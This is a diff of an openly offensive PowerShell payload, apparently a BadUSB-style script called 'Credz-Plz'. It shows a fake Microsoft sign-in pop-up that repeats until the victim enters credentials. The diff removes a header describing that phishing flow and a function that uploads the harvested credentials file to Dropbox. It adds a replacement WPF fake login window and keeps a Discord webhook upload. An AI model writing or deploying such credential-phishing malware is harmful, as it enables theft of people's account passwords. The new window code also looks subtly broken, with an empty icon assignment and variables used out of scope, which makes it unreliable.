@@ -1,56 +1,7 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
-#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-
-<#
-.SYNOPSIS
-	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
-
-.DESCRIPTION 
-	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
-	This will be followed by a fake authentication ui prompt. 
-	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
-	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
-
-.Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
-
-#>
-
-#------------------------------------------------------------------------------------------------------------------------------------
-# This is for if you want to host your own version of the script
-
-# $db = "YOUR-DROPBOX-ACCESS-TOKEN"
-
-# $dc = "YOUR-DISCORD-WEBHOOK"
-
-#------------------------------------------------------------------------------------------------------------------------------------
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
-#------------------------------------------------------------------------------------------------------------------------------------
-
 <#
-
-.NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
-#>
-
 function Get-Creds {
 
     $form = $null
@@ -82,7 +33,81 @@ function Get-Creds {
         }
     }
 }
+#>
 
+function Get-Creds {
+    $form = $null
+
+    while ($form -eq $null) {
+
+        # WPF-based Credential Prompt
+        Add-Type -AssemblyName PresentationCore,PresentationFramework 
+
+        $window = New-Object System.Windows.Window
+        $window.Title = "Authentication Required"
+        $window.SizeToContent = 'WidthAndHeight'  
+        $window.Icon = # Add a path to an icon file if you'd like
+
+        $grid = New-Object System.Windows.Controls.Grid
+        $grid.Margin = 10 
+        $window.Content = $grid
+
+        # Labels and Textboxes
+        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
+        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
+        $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
+        $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
+
+        $usernameLabel = New-Object System.Windows.Controls.Label
+        $usernameLabel.Content = "Username:" 
+        $usernameTextbox = New-Object System.Windows.Controls.TextBox
+        $passwordLabel = New-Object System.Windows.Controls.Label
+        $passwordLabel.Content = "Password:" 
+        $passwordTextbox = New-Object System.Windows.Controls.PasswordBox
+
+        Grid.SetRow($usernameLabel, 0)
+        Grid.SetColumn($usernameLabel, 0)
+        Grid.SetRow($usernameTextbox, 0)
+        Grid.SetColumn($usernameTextbox, 1) 
+        Grid.SetRow($passwordLabel, 1)
+        Grid.SetColumn($passwordLabel, 0)
+        Grid.SetRow($passwordTextbox, 1)
+        Grid.SetColumn($passwordTextbox, 1)
+
+        $grid.Children.Add($usernameLabel) | Out-Null
+        $grid.Children.Add($usernameTextbox) | Out-Null
+        $grid.Children.Add($passwordLabel) | Out-Null
+        $grid.Children.Add($passwordTextbox) | Out-Null
+
+        # Submit Button 
+        $submitButton = New-Object System.Windows.Controls.Button
+        $submitButton.Content = "Submit"
+        $submitButton.Add_Click({
+            # Capture username and password here
+            $username = $usernameTextbox.Text
+            $password = $passwordTextbox.SecurePassword # SecurePassword for security
+            $credsObject = New-Object System.Net.NetworkCredential($username, $password)
+            
+            # Close window
+            $window.Close() 
+            $form = $credsObject 
+        })
+
+        Grid.SetRow($submitButton, 2)
+        Grid.SetColumnSpan($submitButton, 2) 
+        $grid.Children.Add($submitButton) | Out-Null 
+
+        $window.ShowDialog()  
+
+        # Rest of your function logic (error checking, credential return) 
+        if([string]::IsNullOrWhiteSpace($password)) { 
+            # ... your existing error message code ... 
+        } else {
+            $creds = $credsObject  # Since we captured the creds object already
+            return $creds
+        }
+    }
+}
 #----------------------------------------------------------------------------------------------------
 
 <#
@@ -159,32 +184,8 @@ echo $creds >> $env:TMP\$FileName
 <#
 
 .NOTES 
-	This is to upload your files to dropbox
+	This is to upload your files to Discord
 #>
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
-
-#------------------------------------------------------------------------------------------------------------------------------------
 
 function Upload-Discord {
 
